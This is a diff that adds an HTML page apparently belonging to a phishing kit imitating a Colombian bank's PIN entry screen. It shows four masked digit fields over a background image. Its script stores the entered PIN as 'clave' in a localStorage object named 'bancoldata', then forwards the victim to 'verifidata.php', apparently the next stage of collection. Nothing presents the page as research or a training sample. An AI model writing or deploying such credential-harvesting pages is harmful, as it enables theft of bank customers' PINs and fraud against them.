@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Ingreso PIN delicado</title>
+<style>
+  * {
+    margin: 0; padding: 0; box-sizing: border-box;
+  }
+  body, html {
+    height: 100%; width: 100%;
+  }
+  #loader {
+    position: fixed; top: 0; left: 0;
+    width: 100%; height: 100%;
+    background-color: #fff;
+    display: flex; justify-content: center; align-items: center;
+    z-index: 9999;
+  }
+  #loader .spinner {
+    border: 5px solid #f3f3f3;
+    border-top: 5px solid #3498db;
+    border-radius: 50%;
+    width: 50px; height: 50px;
+    animation: spin 1s linear infinite;
+  }
+  @keyframes spin {
+    0% {transform: rotate(0deg);}
+    100% {transform: rotate(360deg);}
+  }
+  .image-container {
+    width: 100%; height: 100%; overflow: hidden; position: relative;
+  }
+  .image-container img {
+    width: 100%; height: 100%; object-fit: cover;
+  }
+  .center-box {
+    position: absolute;
+    top: 59%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background-color: #fff;
+    padding: 20px 30px;
+    display: flex; justify-content: center; align-items: center;
+    border-radius: 8px;
+  }
+  .input-container {
+    display: flex;
+    justify-content: center;
+    gap: 10px;
+    width: auto;
+  }
+  .password-input {
+    width: 28px;
+    height: 20px;
+    text-align: center;
+    font-size: 20px;
+    padding: 10px 0 5px 0;
+    border: none;
+    border-bottom: 1.5px solid #808285;
+    margin: 0 3px;
+    border-radius: 0 !important;
+    background: transparent;
+    outline: none;
+    color: #2c2a29;
+  }
+  .password-input:focus {
+    border-bottom: 1.5px solid #ffc20e;
+  }
+  .button-container {
+    position: absolute;
+    top: 69.5%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    display: flex;
+    gap: 10px;
+  }
+  .button-container button {
+    padding: 17px 39px;
+    font-size: 16px;
+    border: none;
+    border-radius: 50px;
+    font-weight: bold;
+    cursor: pointer;
+  }
+  .button-container button:first-child {
+    background-color: #fff;
+    border: 1px solid black;
+  }
+  .button-container button:last-child.disabled {
+    background-color: #ccc;
+    color: #666;
+    cursor: not-allowed;
+  }
+  .button-container button:last-child.enabled {
+    background-color: #ffda37;
+    color: #010101;
+    cursor: pointer;
+  }
+</style>
+</head>
+<body>
+  <div id="loader">
+    <div class="spinner"></div>
+  </div>
+
+  <div class="image-container">
+    <img src="img/cel2.jpg" alt="Background Image" />
+    <div class="center-box">
+      <div class="input-container">
+        <input type="password" maxlength="1" class="password-input" id="input1" inputmode="numeric" />
+        <input type="password" maxlength="1" class="password-input" id="input2" inputmode="numeric" />
+        <input type="password" maxlength="1" class="password-input" id="input3" inputmode="numeric" />
+        <input type="password" maxlength="1" class="password-input" id="input4" inputmode="numeric" />
+      </div>
+    </div>
+    <div class="button-container">
+      <button>Cancelar</button>
+      <button id="continueButton" class="disabled" disabled>Continuar</button>
+    </div>
+  </div>
+
+  <script>
+    window.addEventListener('load', () => {
+      document.getElementById('loader').style.display = 'none';
+    });
+
+    const inputs = document.querySelectorAll('.password-input');
+    const continueButton = document.getElementById('continueButton');
+
+    inputs.forEach((input, index) => {
+      input.addEventListener('input', (e) => {
+        if (!/^\d$/.test(e.target.value)) e.target.value = '';
+        if (e.target.value !== '' && index < inputs.length - 1) inputs[index + 1].focus();
+
+        const allFilled = Array.from(inputs).every(i => i.value !== '');
+        continueButton.disabled = !allFilled;
+        continueButton.classList.toggle('disabled', !allFilled);
+        continueButton.classList.toggle('enabled', allFilled);
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && index > 0 && e.target.value === '') {
+          inputs[index - 1].focus();
+        }
+      });
+    });
+
+    continueButton.addEventListener('click', () => {
+      if (continueButton.disabled) return;
+      const pin = Array.from(inputs).map(i => i.value).join('');
+      if (pin.length === 4 && /^\d{4}$/.test(pin)) {
+        let bancoldata = localStorage.getItem('bancoldata');
+        bancoldata = bancoldata ? JSON.parse(bancoldata) : {};
+        bancoldata.clave = pin;
+        localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+        window.location.href = 'verifidata.php';
+      } else {
+        alert('Por favor, complete los 4 dígitos correctamente.');
+      }
+    });
+  </script>
+</body>
+</html>
